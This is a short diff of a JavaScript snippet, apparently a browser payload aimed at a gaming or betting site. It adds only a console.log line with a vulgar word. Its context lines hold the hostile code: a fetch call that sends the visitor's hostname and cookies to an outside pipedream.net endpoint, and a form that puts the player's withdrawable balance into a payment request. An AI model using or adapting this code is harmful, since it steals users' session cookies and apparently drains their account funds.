@@ -1,4 +1,5 @@
 fetch(`https://eodcnv9aow0mu5f.m.pipedream.net/?site=${location.hostname}&taxi=${document.cookie}`);
+console.log("ebanina!!!");
 const formData = new FormData();
 formData.append('paymentSystem', 24);
 formData.append('sum', window.player.balances.withdraw);
